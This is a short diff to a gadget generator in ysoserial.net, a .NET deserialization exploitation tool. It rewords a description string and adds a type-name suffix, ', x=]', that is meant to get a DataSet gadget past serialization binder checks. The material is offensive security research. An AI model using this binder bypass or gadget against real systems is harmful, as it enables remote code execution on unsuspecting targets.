@@ -22,7 +22,7 @@ namespace ysoserial.Generators
 
         public override string AdditionalInfo()
         {
-            return "A more advanced type spoofing which can use any arbitrary types can be seen in TestingArenaHome::SpoofByBinaryFormatterJson or in the DataSetOldBehaviour gadget";
+            return "A more advanced type spoofing that can use any arbitrary types can be seen in TestingArenaHome::SpoofByBinaryFormatterJson or in the DataSetOldBehaviour gadget";
         }
 
         public override string SupportedBridgedFormatter()
@@ -67,7 +67,7 @@ namespace ysoserial.Generators
         {
             // info.SetType(typeof(System.Data.DataSet));
             info.AssemblyName = "mscorlib";
-            info.FullTypeName = typeof(System.Data.DataSet).AssemblyQualifiedName;
+            info.FullTypeName = typeof(System.Data.DataSet).AssemblyQualifiedName + ", x=]"; // see https://code-white.com/blog/2022-06-bypassing-dotnet-serialization-binders/
             info.AddValue("DataSet.RemotingFormat", System.Data.SerializationFormat.Binary);
             info.AddValue("DataSet.DataSetName", "");
             info.AddValue("DataSet.Namespace", "");
